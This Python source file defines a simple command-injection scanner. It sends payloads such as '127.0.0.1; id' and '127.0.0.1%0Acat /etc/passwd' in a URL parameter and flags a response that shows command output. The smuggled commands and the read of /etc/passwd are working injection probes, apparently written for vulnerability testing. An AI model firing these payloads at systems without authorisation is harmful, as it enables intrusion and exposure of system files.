import requests

class RCEScanner:
    def __init__(self):
        self.findings = []

    def check_rce(self, target_url, param_name):
        print(f"Checking for RCE on {target_url} with parameter {param_name}")
        payloads = [
            f"127.0.0.1; id",
            f"127.0.0.1&&id",
            f"127.0.0.1%0Aid",
            f"127.0.0.1%0Awhoami",
            f"127.0.0.1%0Acat /etc/passwd",
        ]
        
        for payload in payloads:
            test_url = f"{target_url}?{param_name}={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if "uid=" in response.text or "root:x:0:0" in response.text:
                    self.findings.append({
                        'vulnerability': 'Remote Code Execution (RCE)',
                        'severity': 'Critical',
                        'evidence': f'RCE detected with payload: {payload} on {test_url}',
                        'remediation': 'Implement strict input validation and sanitize all user-supplied input. Avoid using functions that execute system commands with user input.'
                    })
                    print(f"RCE detected: {test_url}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"Error checking RCE on {test_url}: {e}")
        print("RCE scan complete.")

    def get_findings(self):
        return self.findings


